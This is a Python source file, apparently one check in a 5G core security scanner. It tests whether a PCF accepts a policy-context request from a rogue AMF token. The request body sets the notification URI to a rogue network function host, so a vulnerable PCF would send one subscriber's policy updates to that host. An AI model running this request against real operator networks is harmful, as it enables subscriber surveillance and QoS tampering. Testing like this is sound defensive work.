from checks.base_check import BaseCheck, CheckResult
from core import http_client, token_manager
from config import PCF_URL, MCC, MNC, SUPI_START, ROGUE_NF_IP

class PCFPolicyAccessCheck(BaseCheck):
    check_id = "CHECK-008"
    name = "PCF Policy Unauthorized Access"
    affected_nf = "PCF"
    endpoint = "POST /npcf-am-policy-control/v1/policies"
    severity = "HIGH"

    def run(self) -> CheckResult:
        token = token_manager.get_token("PCF", "npcf-am-policy-control")

        supi = f"imsi-{MCC}{MNC}{str(SUPI_START).zfill(10)}"
        url = f"{PCF_URL}/npcf-am-policy-control/v1/policies"
        body = {
            "notificationUri": f"http://{ROGUE_NF_IP}:8000/callback",
            "supi": supi,
            "pei": "imeisv-1110000000000000",
            "ipv4Address": "10.60.0.1"
        }

        request = {
            "method": "POST",
            "url": url,
            "headers": {"Authorization": "Bearer <rogue AMF token scoped for npcf-am-policy-control>"},
            "body": body
        }

        if not token:
            return self.result(
                status="ERROR",
                request=request,
                response={},
                evidence="Could not obtain token from NRF",
                conclusion="Token request failed — cannot test PCF policy access."
            )

        try:
            resp = http_client.post(url, token=token, json=body)

            response = {
                "status_code": resp.status_code,
                "body": resp.text[:500]
            }

            if resp.status_code in [200, 201]:
                return self.result(
                    status="VULNERABLE",
                    request=request,
                    response=response,
                    evidence=f"PCF accepted policy context creation for {supi} from rogue AMF. "
                             f"Notification URI set to rogue NF at {ROGUE_NF_IP}",
                    conclusion="PCF does not verify that the requesting AMF is currently "
                               "serving this subscriber. Rogue NF registered as policy "
                               "consumer — will receive real-time policy notifications. "
                               "Enables subscriber surveillance and potential QoS manipulation."
                )
            elif resp.status_code == 403:
                return self.result(
                    status="PATCHED",
                    request=request,
                    response=response,
                    evidence="PCF returned 403 — unauthorized access blocked",
                    conclusion="PCF enforces per-subscriber authorization."
                )
            else:
                return self.result(
                    status="ERROR",
                    request=request,
                    response=response,
                    evidence=f"Unexpected status code {resp.status_code}",
                    conclusion="Unexpected response from PCF."
                )
        except Exception as e:
            return self.result(
                status="ERROR",
                request=request,
                response={},
                evidence=str(e),
                conclusion="Could not reach PCF."
            )